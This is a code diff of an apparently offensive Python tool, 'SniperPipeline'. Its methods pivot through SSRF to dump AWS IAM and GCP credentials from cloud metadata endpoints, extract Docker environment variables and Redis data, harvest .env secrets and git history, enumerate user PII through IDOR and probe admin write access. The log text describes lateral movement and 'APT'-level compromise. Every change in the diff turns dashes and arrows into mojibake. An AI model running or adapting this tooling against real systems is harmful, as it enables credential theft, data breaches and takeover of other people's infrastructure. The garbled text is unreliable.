                         "description": f"Complete environment file accessible at {env_path}. Parsed {kv_count} key-value pairs including {len(extracted_secrets)} high-value secrets (database URIs, API keys, authentication tokens). Raw credential extraction confirmed.",
                         "severity": "critical",
                         "category": "env_exposure",
@@ -1975,10 +2054,10 @@ class SniperPipeline:
         }
 
         if extracted_secrets:
-            pipeline_log(f"[SINFO] ENV PARSER COMPLETE — {len(extracted_secrets)} raw secrets extracted across {len(env_paths)} paths", "error", "infra_ssrf")
+            pipeline_log(f"[SINFO] ENV PARSER COMPLETE â€” {len(extracted_secrets)} raw secrets extracted across {len(env_paths)} paths", "error", "infra_ssrf")
 
     async def _git_objects_reconstructor(self):
-        pipeline_log("[SINFO] Git Objects Reconstructor — Probing /.git/ for repository leak...", "warn", "infra_ssrf")
+        pipeline_log("[SINFO] Git Objects Reconstructor â€” Probing /.git/ for repository leak...", "warn", "infra_ssrf")
         git_objects = []
         git_exposed = False
 
@@ -2009,7 +2088,7 @@ class SniperPipeline:
                     if git_path == "/.git/logs/HEAD":
                         commit_hashes = re.findall(r'([a-f0-9]{40})', content)
                         if commit_hashes:
-                            pipeline_log(f"[SINFO] GIT LOG: {len(commit_hashes)} commit hashes recoverable — scanning for deleted secrets", "error", "infra_ssrf")
+                            pipeline_log(f"[SINFO] GIT LOG: {len(commit_hashes)} commit hashes recoverable â€” scanning for deleted secrets", "error", "infra_ssrf")
 
                             for ch in commit_hashes[:5]:
                                 obj_path = f"/.git/objects/{ch[:2]}/{ch[2:]}"
@@ -2029,8 +2108,8 @@ class SniperPipeline:
 
         if git_exposed:
             self._add_finding({
-                "title": f"SINFO: Git repository exposed — {len(git_objects)} objects recoverable",
-                "description": f"Full .git directory exposed at {self.base_url}/.git/. Recovered {len(git_objects)} git objects including HEAD, config, commit logs, and object blobs. Historical commit reconstruction possible — previously deleted secrets may be recoverable from git history.",
+                "title": f"SINFO: Git repository exposed â€” {len(git_objects)} objects recoverable",
+                "description": f"Full .git directory exposed at {self.base_url}/.git/. Recovered {len(git_objects)} git objects including HEAD, config, commit logs, and object blobs. Historical commit reconstruction possible â€” previously deleted secrets may be recoverable from git history.",
                 "severity": "critical",
                 "category": "git_exposure",
                 "module": "git_reconstructor",
@@ -2056,7 +2135,7 @@ class SniperPipeline:
         if not docker_ssrf:
             return
 
-        pipeline_log("[SINFO] Docker Full Inspect — Pivoting via confirmed SSRF to dump container internals...", "error", "infra_ssrf")
+        pipeline_log("[SINFO] Docker Full Inspect â€” Pivoting via confirmed SSRF to dump container internals...", "error", "infra_ssrf")
         docker_data = []
         pivot_endpoint = docker_ssrf[0].get("endpoint", "/api/proxy")
         pivot_param = docker_ssrf[0].get("param", "url")
@@ -2129,7 +2208,7 @@ class SniperPipeline:
         if not aws_ssrf:
             return
 
-        pipeline_log("[SINFO] IMDSv2 Bypass — Attempting PUT token acquisition for AWS credential dump...", "error", "infra_ssrf")
+        pipeline_log("[SINFO] IMDSv2 Bypass â€” Attempting PUT token acquisition for AWS credential dump...", "error", "infra_ssrf")
         pivot_endpoint = aws_ssrf[0].get("endpoint", "/api/proxy")
         pivot_param = aws_ssrf[0].get("param", "url")
         imds_data = []
@@ -2144,7 +2223,7 @@ class SniperPipeline:
             )
             if resp.status_code == 200 and len(resp.text.strip()) > 10:
                 token = resp.text.strip()
-                pipeline_log(f"[IMDSv2] Session token acquired — {len(token)} chars — bypassing IMDSv2 protection", "error", "infra_ssrf")
+                pipeline_log(f"[IMDSv2] Session token acquired â€” {len(token)} chars â€” bypassing IMDSv2 protection", "error", "infra_ssrf")
         except Exception:
             pass
 
@@ -2170,7 +2249,7 @@ class SniperPipeline:
                     if "security-credentials" in cred_path:
                         role_names = [l.strip() for l in body.split('\n') if l.strip() and not l.strip().startswith('{')]
                         for role in role_names[:3]:
-                            pipeline_log(f"[IMDSv2] IAM Role discovered: {role} — attempting credential dump", "error", "infra_ssrf")
+                            pipeline_log(f"[IMDSv2] IAM Role discovered: {role} â€” attempting credential dump", "error", "infra_ssrf")
                             try:
                                 role_url = f"http://169.254.169.254{cred_path}{role}"
                                 role_resp = await self.client.get(
@@ -2190,7 +2269,7 @@ class SniperPipeline:
                                 pass
 
                     if "instance-identity/document" in cred_path:
-                        pipeline_log(f"[IMDSv2] Instance identity document extracted — account/region/instance info", "error", "infra_ssrf")
+                        pipeline_log(f"[IMDSv2] Instance identity document extracted â€” account/region/instance info", "error", "infra_ssrf")
             except Exception:
                 pass
 
@@ -2212,7 +2291,7 @@ class SniperPipeline:
         }
 
     async def _capture_session_tokens(self):
-        pipeline_log("[SINFO] Session Token Capture — Extracting cookies, JWTs, and session identifiers...", "warn", "infra_ssrf")
+        pipeline_log("[SINFO] Session Token Capture â€” Extracting cookies, JWTs, and session identifiers...", "warn", "infra_ssrf")
         tokens = []
 
         auth_endpoints = ["/", "/api/auth/session", "/api/me", "/api/user", "/api/profile", "/dashboard", "/api/v1/auth/token"]
@@ -2261,7 +2340,7 @@ class SniperPipeline:
                         "value_length": len(jwt),
                         "source": ep,
                     })
-                    pipeline_log(f"[SESSION] JWT token captured from {ep} — {len(jwt)} chars", "error", "infra_ssrf")
+                    pipeline_log(f"[SESSION] JWT token captured from {ep} â€” {len(jwt)} chars", "error", "infra_ssrf")
             except Exception:
                 pass
 
@@ -2279,7 +2358,7 @@ class SniperPipeline:
             })
 
     async def _deep_credential_extraction(self, confirmed_ssrf: list):
-        pipeline_log("[DEEP EXTRACT] Credential Persistence — Extracting raw infrastructure secrets from confirmed vectors...", "error", "infra_ssrf")
+        pipeline_log("[DEEP EXTRACT] Credential Persistence â€” Extracting raw infrastructure secrets from confirmed vectors...", "error", "infra_ssrf")
         extracted = []
 
         for ssrf_hit in confirmed_ssrf:
@@ -2324,7 +2403,7 @@ class SniperPipeline:
                                                             })
                                                 if cred_vars:
                                                     extracted.append({
-                                                        "source": f"SSRF → Docker Container {ct_name}",
+                                                        "source": f"SSRF â†’ Docker Container {ct_name}",
                                                         "type": "DOCKER_ENV_DUMP",
                                                         "container_id": ct_id,
                                                         "container_name": ct_name,
@@ -2333,7 +2412,7 @@ class SniperPipeline:
                                                         "impact": "TOTAL_COMPROMISE",
                                                     })
                                                     pipeline_log(
-                                                        f"[DEEP EXTRACT] DOCKER ENV DUMP: Container {ct_name} ({ct_id}) — {len(cred_vars)} production credentials captured (AWS_KEY, DB_PASS, STRIPE_KEY, etc.)",
+                                                        f"[DEEP EXTRACT] DOCKER ENV DUMP: Container {ct_name} ({ct_id}) â€” {len(cred_vars)} production credentials captured (AWS_KEY, DB_PASS, STRIPE_KEY, etc.)",
                                                         "error", "infra_ssrf"
                                                     )
                                     except Exception:
@@ -2363,12 +2442,12 @@ class SniperPipeline:
                                 "content_hash": hashlib.sha256(resp.text[:2000].encode()).hexdigest()[:16],
                                 "has_data": len(resp.text.strip()) > 10,
                             })
-                            pipeline_log(f"[DEEP EXTRACT] REDIS DUMP: {cmd_name} — {len(resp.text)} bytes exfiltrated", "error", "infra_ssrf")
+                            pipeline_log(f"[DEEP EXTRACT] REDIS DUMP: {cmd_name} â€” {len(resp.text)} bytes exfiltrated", "error", "infra_ssrf")
                     except Exception:
                         pass
                 if redis_data:
                     extracted.append({
-                        "source": f"SSRF → Redis ({endpoint})",
+                        "source": f"SSRF â†’ Redis ({endpoint})",
                         "type": "REDIS_DUMP",
                         "commands_executed": len(redis_data),
                         "commands": redis_data,
@@ -2404,7 +2483,7 @@ class SniperPipeline:
                                                 "raw_content": cred_resp.text[:5000],
                                                 "content_hash": hashlib.sha256(cred_resp.text[:2000].encode()).hexdigest()[:16],
                                             })
-                                            pipeline_log(f"[DEEP EXTRACT] AWS IAM CREDENTIAL DUMP: Role={role} — AccessKeyId + SecretAccessKey + SessionToken extracted", "error", "infra_ssrf")
+                                            pipeline_log(f"[DEEP EXTRACT] AWS IAM CREDENTIAL DUMP: Role={role} â€” AccessKeyId + SecretAccessKey + SessionToken extracted", "error", "infra_ssrf")
                                     except Exception:
                                         pass
                             elif "user-data" in iam_path:
@@ -2420,7 +2499,7 @@ class SniperPipeline:
                         pass
                 if aws_creds:
                     extracted.append({
-                        "source": f"SSRF → AWS Metadata ({endpoint})",
+                        "source": f"SSRF â†’ AWS Metadata ({endpoint})",
                         "type": "AWS_CREDENTIAL_DUMP",
                         "credentials_count": len(aws_creds),
                         "credentials": aws_creds[:20],
@@ -2449,12 +2528,12 @@ class SniperPipeline:
                                 "content_hash": hashlib.sha256(resp.text[:2000].encode()).hexdigest()[:16],
                             })
                             if "token" in gpath:
-                                pipeline_log(f"[DEEP EXTRACT] GCP SERVICE ACCOUNT TOKEN DUMPED — OAuth2 access token for default SA", "error", "infra_ssrf")
+                                pipeline_log(f"[DEEP EXTRACT] GCP SERVICE ACCOUNT TOKEN DUMPED â€” OAuth2 access token for default SA", "error", "infra_ssrf")
                     except Exception:
                         pass
                 if gcp_data:
                     extracted.append({
-                        "source": f"SSRF → GCP Metadata ({endpoint})",
+                        "source": f"SSRF â†’ GCP Metadata ({endpoint})",
                         "type": "GCP_CREDENTIAL_DUMP",
                         "endpoints_dumped": len(gcp_data),
                         "data": gcp_data,
@@ -2475,12 +2554,12 @@ class SniperPipeline:
                 "evidence": f"{len(extracted)} dumps, {total_creds} credentials",
             })
             pipeline_log(
-                f"[DEEP EXTRACT] CREDENTIAL PERSISTENCE COMPLETE — {len(extracted)} infrastructure dumps, {total_creds} raw secrets captured for lateral movement",
+                f"[DEEP EXTRACT] CREDENTIAL PERSISTENCE COMPLETE â€” {len(extracted)} infrastructure dumps, {total_creds} raw secrets captured for lateral movement",
                 "error", "infra_ssrf"
             )
 
     async def _idor_sequential_fetch(self):
-        pipeline_log("[DEEP EXTRACT] IDOR Sequential Fetch — Enumerating user records via confirmed IDOR vectors...", "error", "infra_ssrf")
+        pipeline_log("[DEEP EXTRACT] IDOR Sequential Fetch â€” Enumerating user records via confirmed IDOR vectors...", "error", "infra_ssrf")
         idor_findings = [f for f in self.findings if any(kw in (f.get("title", "") + f.get("category", "")).lower() for kw in ["idor", "direct object", "insecure direct", "auth bypass", "unauthorized access"])]
 
         if not idor_findings:
@@ -2535,7 +2614,7 @@ class SniperPipeline:
                     "enumerable": records_found >= 3,
                 })
                 pipeline_log(
-                    f"[DEEP EXTRACT] IDOR SEQUENTIAL: {ep_config['path']} — {records_found}/10 records dumped, PII fields: {', '.join(pii_fields_detected)}",
+                    f"[DEEP EXTRACT] IDOR SEQUENTIAL: {ep_config['path']} â€” {records_found}/10 records dumped, PII fields: {', '.join(pii_fields_detected)}",
                     "error", "infra_ssrf"
                 )
 
@@ -2555,7 +2634,7 @@ class SniperPipeline:
             })
 
     async def _auth_bypass_deep_read(self):
-        pipeline_log("[DEEP EXTRACT] Auth Bypass Deep Read — Extracting raw credentials from exposed config files...", "error", "infra_ssrf")
+        pipeline_log("[DEEP EXTRACT] Auth Bypass Deep Read â€” Extracting raw credentials from exposed config files...", "error", "infra_ssrf")
         bypass_findings = [f for f in self.findings if any(kw in (f.get("title", "") + f.get("description", "")).lower() for kw in ["auth bypass", "admin panel", "config exposed", ".env", "file_exposure", "source map"])]
 
         sensitive_paths = [
@@ -2600,7 +2679,7 @@ class SniperPipeline:
                         })
                         cred_keys = [c["key"] for c in extracted_creds if c["is_credential"]]
                         pipeline_log(
-                            f"[DEEP EXTRACT] AUTH BYPASS FILE READ: {fp['path']} — {len(extracted_creds)} secrets dumped ({', '.join(cred_keys[:5])})",
+                            f"[DEEP EXTRACT] AUTH BYPASS FILE READ: {fp['path']} â€” {len(extracted_creds)} secrets dumped ({', '.join(cred_keys[:5])})",
                             "error", "infra_ssrf"
                         )
             except Exception:
@@ -2635,7 +2714,7 @@ class SniperPipeline:
                                 "credentials": creds[:20],
                                 "content_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                             })
-                            pipeline_log(f"[DEEP EXTRACT] SUBDOMAIN FILE READ: {sub_host}{env_path} — {len(creds)} raw credentials dumped", "error", "infra_ssrf")
+                            pipeline_log(f"[DEEP EXTRACT] SUBDOMAIN FILE READ: {sub_host}{env_path} â€” {len(creds)} raw credentials dumped", "error", "infra_ssrf")
                 except Exception:
                     pass
 
@@ -2654,7 +2733,7 @@ class SniperPipeline:
             })
 
     async def _admin_privilege_exploitation(self):
-        pipeline_log("[DEEP EXTRACT] Admin Privilege Exploitation — Probing manipulation capabilities on confirmed admin access...", "error", "infra_ssrf")
+        pipeline_log("[DEEP EXTRACT] Admin Privilege Exploitation â€” Probing manipulation capabilities on confirmed admin access...", "error", "infra_ssrf")
         admin_findings = [f for f in self.findings if any(kw in (f.get("title", "") + f.get("category", "")).lower() for kw in ["admin", "auth bypass", "privilege", "management", "dashboard"])]
 
         if not admin_findings:
@@ -2702,7 +2781,7 @@ class SniperPipeline:
                             "capability_count": len(capabilities),
                         })
                         pipeline_log(
-                            f"[DEEP EXTRACT] ADMIN ACCESS: {ap['path']} — Capabilities: {', '.join(capabilities)}",
+                            f"[DEEP EXTRACT] ADMIN ACCESS: {ap['path']} â€” Capabilities: {', '.join(capabilities)}",
                             "error", "infra_ssrf"
                         )
             except Exception:
@@ -2733,7 +2812,7 @@ class SniperPipeline:
                         "capabilities": ["WRITE_ACCESS_CONFIRMED"],
                     })
                     pipeline_log(
-                        f"[DEEP EXTRACT] ADMIN WRITE CONFIRMED: {wt['desc']} at {wt['path']} — HTTP {resp.status_code}",
+                        f"[DEEP EXTRACT] ADMIN WRITE CONFIRMED: {wt['desc']} at {wt['path']} â€” HTTP {resp.status_code}",
                         "error", "infra_ssrf"
                     )
                 elif resp.status_code in (400, 422):
@@ -2755,7 +2834,7 @@ class SniperPipeline:
             all_caps = list(set(c for p in manipulation_probes for c in p.get("capabilities", [])))
             self._add_finding({
                 "title": f"Admin Privilege Exploitation: {len(manipulation_probes)} admin vectors probed, {len(write_confirmed)} write operations confirmed",
-                "description": f"Confirmed admin access across {len(manipulation_probes)} endpoints. Capabilities detected: {', '.join(all_caps)}. {'Write access confirmed — attacker can manipulate financial data (price → R$0.01), elevate user privileges, forge discount coupons (100%), and disable security logging.' if write_confirmed else 'Read-only admin access confirmed — attacker can enumerate users, view financial records, and access system configuration.'}",
+                "description": f"Confirmed admin access across {len(manipulation_probes)} endpoints. Capabilities detected: {', '.join(all_caps)}. {'Write access confirmed â€” attacker can manipulate financial data (price â†’ R$0.01), elevate user privileges, forge discount coupons (100%), and disable security logging.' if write_confirmed else 'Read-only admin access confirmed â€” attacker can enumerate users, view financial records, and access system configuration.'}",
                 "severity": "critical",
                 "category": "admin_exploitation",
                 "module": "admin_privilege_exploitation",
@@ -2765,7 +2844,7 @@ class SniperPipeline:
 
     async def _phase_4_infra_ssrf(self):
         pipeline_emit("phase_update", {"phase": "infra_ssrf", "status": "running"})
-        pipeline_log("[PHASE 5/6] INFRA SSRF — Probing internal network exposure via SSRF vectors...", "warn", "infra_ssrf")
+        pipeline_log("[PHASE 5/6] INFRA SSRF â€” Probing internal network exposure via SSRF vectors...", "warn", "infra_ssrf")
 
         await self._sinfo_env_parser()
         await self._git_objects_reconstructor()
@@ -2818,7 +2897,7 @@ class SniperPipeline:
                                 "status_code": resp.status_code,
                                 "response_time_ms": elapsed,
                                 "vulnerable": True,
-                                "verdict": f"VULNERABLE — {vector['name']} accessible",
+                                "verdict": f"VULNERABLE â€” {vector['name']} accessible",
                                 "severity": vector["severity"],
                                 "description": vector["name"],
                                 "payload": vector["url"],
@@ -2874,7 +2953,7 @@ class SniperPipeline:
         pipeline_emit("telemetry_update", {"progress": 90, "phase": "infra_ssrf"})
 
         pipeline_log(
-            f"[INFRA SSRF COMPLETE] {len(confirmed)}/{tested} requests — "
+            f"[INFRA SSRF COMPLETE] {len(confirmed)}/{tested} requests â€” "
             f"{len(confirmed)} internal services exposed",
             "error" if confirmed else "success",
             "infra_ssrf"
@@ -2883,7 +2962,7 @@ class SniperPipeline:
     async def _phase_4b_persistence_assessment(self):
         pipeline_emit("phase_update", {"phase": "persistence_assessment", "status": "running"})
         pipeline_log(
-            "[PHASE 4b] PERSISTENCE ASSESSMENT — Evaluating persistence vector exposure...",
+            "[PHASE 4b] PERSISTENCE ASSESSMENT â€” Evaluating persistence vector exposure...",
             "warn", "persistence"
         )
 
@@ -2922,7 +3001,7 @@ class SniperPipeline:
                             "severity": "CRITICAL",
                         })
                         pipeline_log(
-                            f"[THREAT] WEBSHELL DETECTED: {path} — PHP/exec code in response",
+                            f"[THREAT] WEBSHELL DETECTED: {path} â€” PHP/exec code in response",
                             "error", "persistence"
                         )
                         self._add_finding({
@@ -3022,16 +3101,16 @@ class SniperPipeline:
             "persistence_files_tested": len(persistence_file_paths),
             "upload_endpoints_tested": len(upload_endpoints),
             "assessment": (
-                "CRITICAL — Persistence vectors available"
+                "CRITICAL â€” Persistence vectors available"
                 if any(v["severity"] == "CRITICAL" for v in persistence_vectors)
-                else "HIGH — Some persistence paths accessible"
+                else "HIGH â€” Some persistence paths accessible"
                 if persistence_vectors
-                else "HARDENED — No obvious persistence vectors"
+                else "HARDENED â€” No obvious persistence vectors"
             ),
         }
 
         pipeline_log(
-            f"[PERSISTENCE] Assessment complete — {len(persistence_vectors)} vectors found "
+            f"[PERSISTENCE] Assessment complete â€” {len(persistence_vectors)} vectors found "
             f"({sum(1 for v in persistence_vectors if v['severity'] == 'CRITICAL')} critical)",
             "error" if persistence_vectors else "success",
             "persistence"
@@ -3079,9 +3158,9 @@ class SniperPipeline:
         if priv_esc > 0:
             key_findings.append(f"Privilege escalation achieved via {priv_esc} vectors")
         if persist.get("critical_vectors", 0) > 0:
-            key_findings.append(f"Persistence vectors available — {persist['critical_vectors']} critical paths")
+            key_findings.append(f"Persistence vectors available â€” {persist['critical_vectors']} critical paths")
         if not key_findings:
-            key_findings.append("Target appears hardened — no critical exploitation vectors confirmed")
+            key_findings.append("Target appears hardened â€” no critical exploitation vectors confirmed")
 
         if crit_count >= 5:
             financial_risk = "$15M - $50M (regulatory fines + customer churn + remediation)"
@@ -3094,8 +3173,8 @@ class SniperPipeline:
 
         regulatory_risk = []
         if ssrf_creds > 0 or db_pivots > 0:
-            regulatory_risk.append("GDPR violation — personal data accessible")
-            regulatory_risk.append("PCI DSS non-compliance — credential exposure")
+            regulatory_risk.append("GDPR violation â€” personal data accessible")
+            regulatory_risk.append("PCI DSS non-compliance â€” credential exposure")
         if crit_count > 0:
             regulatory_risk.append("SOC2 Type II audit findings expected")
 
@@ -3178,7 +3257,7 @@ class SniperPipeline:
             },
             "board_summary": {
                 "headline": (
-                    f"Target at risk — {crit_count} critical vulnerabilities with confirmed exploitation"
+                    f"Target at risk â€” {crit_count} critical vulnerabilities with confirmed exploitation"
                     if crit_count > 0
                     else f"Target shows {high_count} high-severity findings requiring attention"
                     if high_count > 0
@@ -3189,11 +3268,11 @@ class SniperPipeline:
                     "financial_risk": financial_risk,
                     "regulatory_risk": regulatory_risk,
                     "reputational_risk": (
-                        "High — breach disclosure would generate media coverage"
+                        "High â€” breach disclosure would generate media coverage"
                         if crit_count >= 3
-                        else "Medium — targeted disclosure risk"
+                        else "Medium â€” targeted disclosure risk"
                         if crit_count >= 1
-                        else "Low — limited external impact"
+                        else "Low â€” limited external impact"
                     ),
                 },
                 "immediate_actions": immediate_actions[:5],
@@ -3229,7 +3308,7 @@ class SniperPipeline:
 
         pipeline_emit("executive_compromise_report", self.executive_report)
         pipeline_log(
-            f"[EXECUTIVE] Report generated — Classification: {classification}, "
+            f"[EXECUTIVE] Report generated â€” Classification: {classification}, "
             f"Key findings: {len(key_findings)}, Recommendations: {len(recommendations)}",
             "warn" if classification in ("CRITICAL", "HIGH") else "info",
             "telemetry"
@@ -3238,7 +3317,7 @@ class SniperPipeline:
     async def _phase_4c_sniper_decision(self):
         pipeline_emit("phase_update", {"phase": "sniper_decision", "status": "running"})
         pipeline_log(
-            "[PHASE 5.5/7] SNIPER DECISION ENGINE — APT Level 5 cognitive decision layer activating...",
+            "[PHASE 5.5/7] SNIPER DECISION ENGINE â€” APT Level 5 cognitive decision layer activating...",
             "error", "decision_engine"
         )
         pipeline_log(
@@ -3329,7 +3408,7 @@ class SniperPipeline:
             pipeline_emit("telemetry_update", {"progress": 88, "phase": "sniper_decision"})
 
         except asyncio.TimeoutError:
-            pipeline_log("[DECISION] Engine timeout (60s) — partial results preserved", "error", "decision_engine")
+            pipeline_log("[DECISION] Engine timeout (60s) â€” partial results preserved", "error", "decision_engine")
             pipeline_emit("phase_update", {"phase": "sniper_decision", "status": "timeout"})
         except Exception as e:
             pipeline_log(f"[DECISION] Engine error: {str(e)[:200]}", "error", "decision_engine")
@@ -3338,7 +3417,7 @@ class SniperPipeline:
     async def _phase_4d_autonomous_consolidator(self):
         pipeline_emit("phase_update", {"phase": "autonomous_consolidator", "status": "running"})
         pipeline_log(
-            "[PHASE 5.7/7] MOTOR 11 — AUTONOMOUS CONSOLIDATOR ENGINE — "
+            "[PHASE 5.7/7] MOTOR 11 â€” AUTONOMOUS CONSOLIDATOR ENGINE â€” "
             "Brutal dictionary + Bayesian decision + Genetic mutation...",
             "error", "motor11"
         )
@@ -3397,13 +3476,13 @@ class SniperPipeline:
             pipeline_emit("telemetry_update", {"progress": 92, "phase": "autonomous_consolidator"})
 
             pipeline_log(
-                f"[MOTOR 11] COMPLETE — {confirmed}/{total_tests} confirmed vulns, "
+                f"[MOTOR 11] COMPLETE â€” {confirmed}/{total_tests} confirmed vulns, "
                 f"dictionary: {self.autonomous_report.get('dictionary_total', 0)} payloads",
                 "error" if confirmed > 0 else "success", "motor11"
             )
 
         except asyncio.TimeoutError:
-            pipeline_log("[MOTOR 11] Engine timeout (120s) — partial results preserved", "error", "motor11")
+            pipeline_log("[MOTOR 11] Engine timeout (120s) â€” partial results preserved", "error", "motor11")
             pipeline_emit("phase_update", {"phase": "autonomous_consolidator", "status": "timeout"})
         except Exception as e:
             pipeline_log(f"[MOTOR 11] Engine error: {str(e)[:200]}", "error", "motor11")
@@ -3411,7 +3490,7 @@ class SniperPipeline:
 
     async def _phase_5_telemetry_report(self):
         pipeline_emit("phase_update", {"phase": "telemetry", "status": "running"})
-        pipeline_log("[PHASE 6/6] TELEMETRY — Compiling final operation report...", "info", "telemetry")
+        pipeline_log("[PHASE 6/6] TELEMETRY â€” Compiling final operation report...", "info", "telemetry")
 
         vuln_probes = [p for p in self.probes if p.get("vulnerable")]
         crit_findings = [f for f in self.findings if f.get("severity", "").lower() == "critical"]
@@ -3498,7 +3577,7 @@ class SniperPipeline:
             pa = self.persistence_assessment
             pipeline_log(
                 f"[TELEMETRY] Persistence Assessment: {pa.get('vectors_found', 0)} vectors, "
-                f"{pa.get('critical_vectors', 0)} critical — {pa.get('assessment', 'N/A')}",
+                f"{pa.get('critical_vectors', 0)} critical â€” {pa.get('assessment', 'N/A')}",
                 "error" if pa.get("critical_vectors", 0) > 0 else "success",
                 "telemetry"
             )
@@ -3516,16 +3595,16 @@ class SniperPipeline:
 
         if self.counts["critical"] > 0:
             pipeline_log(
-                f"[THREAT] TARGET AT RISK — {self.counts['critical']} CRITICAL vulnerabilities require immediate remediation",
+                f"[THREAT] TARGET AT RISK â€” {self.counts['critical']} CRITICAL vulnerabilities require immediate remediation",
                 "error", "telemetry"
             )
         elif self.counts["high"] > 0:
             pipeline_log(
-                f"[ALERT] {self.counts['high']} HIGH severity findings detected — review recommended",
+                f"[ALERT] {self.counts['high']} HIGH severity findings detected â€” review recommended",
                 "warn", "telemetry"
             )
         else:
-            pipeline_log("[BLOCK] TARGET HARDENED — No critical/high exploitable vectors confirmed", "success", "telemetry")
+            pipeline_log("[BLOCK] TARGET HARDENED â€” No critical/high exploitable vectors confirmed", "success", "telemetry")
 
         self.phases_completed.append("telemetry")
         pipeline_emit("phase_update", {"phase": "telemetry", "status": "completed"})
@@ -3562,7 +3641,7 @@ class SniperPipeline:
                 "target": self.target,
                 "success": bypassed,
                 "evidence": (
-                    f"High Defensibility: {waf_def.get('blocked_probes', 0)}/{waf_def.get('total_probes', 0)} blocked → Data Drift redirect"
+                    f"High Defensibility: {waf_def.get('blocked_probes', 0)}/{waf_def.get('total_probes', 0)} blocked â†’ Data Drift redirect"
                     if waf_def.get("high_defensibility")
                     else ("WAF bypass confirmed via polymorphic mutations" if bypassed else "WAF blocking probes")
                 ),
@@ -3606,7 +3685,7 @@ class SniperPipeline:
         if ci:
             chain.append({
                 "phase": "Chain Intelligence",
-                "technique": "SSRF → credential harvest → DB pivot",
+                "technique": "SSRF â†’ credential harvest â†’ DB pivot",
                 "target": f"{ci.get('total_probes', 0)} probes",
                 "success": ci.get("ssrf_captures_count", 0) > 0 or ci.get("db_pivots_confirmed", 0) > 0,
                 "evidence": f"{ci.get('ssrf_captures_count', 0)} SSRF captures, {ci.get('db_pivots_confirmed', 0)} DB pivots",
@@ -3627,7 +3706,7 @@ class SniperPipeline:
         if db_ref.get("activated"):
             chain.append({
                 "phase": "DB Reflection Validation",
-                "technique": "SSRF → internal DB/service probing",
+                "technique": "SSRF â†’ internal DB/service probing",
                 "target": f"{db_ref.get('total_reflections', 0)} reflections tested",
                 "success": db_ref.get("confirmed_reflections", 0) > 0,
                 "evidence": f"{db_ref.get('confirmed_reflections', 0)} confirmed, {db_ref.get('pii_confirmed', 0)} PII reachable",
@@ -3650,7 +3729,7 @@ class SniperPipeline:
                 "technique": "Webshell detection + file upload + SSRF file read",
                 "target": f"{pa.get('webshell_paths_tested', 0)} paths tested",
                 "success": pa.get("critical_vectors", 0) > 0,
-                "evidence": f"{pa.get('vectors_found', 0)} vectors, {pa.get('critical_vectors', 0)} critical — {pa.get('assessment', 'N/A')}",
+                "evidence": f"{pa.get('vectors_found', 0)} vectors, {pa.get('critical_vectors', 0)} critical â€” {pa.get('assessment', 'N/A')}",
             })
 
         if self.sniper_decision_report:
